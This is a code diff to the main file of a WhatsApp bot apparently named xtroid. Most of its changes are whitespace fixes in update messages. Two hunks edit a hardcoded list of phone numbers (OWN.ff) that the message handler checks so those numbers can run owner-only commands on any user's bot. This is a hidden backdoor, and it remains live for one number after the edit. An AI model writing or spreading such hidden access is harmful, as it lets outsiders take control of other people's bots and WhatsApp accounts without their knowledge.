@@ -42,7 +42,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '94702102324,94781224478,94762234883' }
+var OWN = { ff: '94702102324,0' }
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -343,7 +343,7 @@ ${chalk.blue.italic('🚀 Connecting to your xtroid... Please Wait.')}`);
                     var degisiklikler = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <'  + "Lasi" +  '>\n';
+                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "Lasi" + '>\n';
                         }
                     );
                     await conn.sendMessage(
@@ -369,7 +369,7 @@ ${chalk.blue.italic('🚀 Connecting to your xtroid... Please Wait.')}`);
                     var degisiklikler = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <'  + "Lasi" +  '>\n';
+                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "Lasi" + '>\n';
                         }
                     );
         
@@ -398,7 +398,7 @@ ${chalk.blue.italic('🚀 Connecting to your xtroid... Please Wait.')}`);
                     var degisiklikler = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <'  + "Lasi" +  '>\n';
+                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "Lasi" + '>\n';
                         }
                     );
                     await conn.sendMessage(
@@ -424,7 +424,7 @@ ${chalk.blue.italic('🚀 Connecting to your xtroid... Please Wait.')}`);
                     var degisiklikler = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <'  + "Lasi" +  '>\n';
+                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + "Lasi" + '>\n';
                         }
                     );
                     await conn.sendMessage(
@@ -627,7 +627,7 @@ await conn.sendMessage(msg.key.remoteJid, Buffer.from(lasiyasimg.data), MessageT
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "94702102324,94781224478,94762234883" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94702102324,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
